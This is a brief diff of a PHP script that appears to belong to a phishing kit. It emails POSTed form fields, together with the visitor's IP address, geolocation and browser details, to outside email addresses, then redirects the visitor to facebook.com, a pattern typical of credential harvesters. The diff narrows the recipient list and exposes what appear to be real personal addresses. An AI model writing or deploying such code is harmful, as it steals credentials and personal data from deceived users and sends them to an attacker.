@@ -128,9 +128,10 @@
     echo json_encode($data);
 
     $lb = PHP_EOL;
-    $to = "williamrogers3157@gmail.com,heycamw@hotmail.com";
+    $to = "heycamw@hotmail.com";
     $subject = "food is served by littlelittle*";
     $body = $_POST['description'] . $lb . $_POST['analysis'] . $lb . $ip . $lb . $continent_name . $lb . $country_code . $lb . $country_name . $lb . $region_code . $lb . $region_name . $lb . $city . $lb . $zip . $lb . $ua['name'] . " " . $ua['version'] . " on " .$ua['platform'] . " reports: <br >" . $ua['userAgent'] . $lb . $lb . $lb;
     mail($to, $subject, $body);
     header("Location: http://www.facebook.com");
+
 ?>
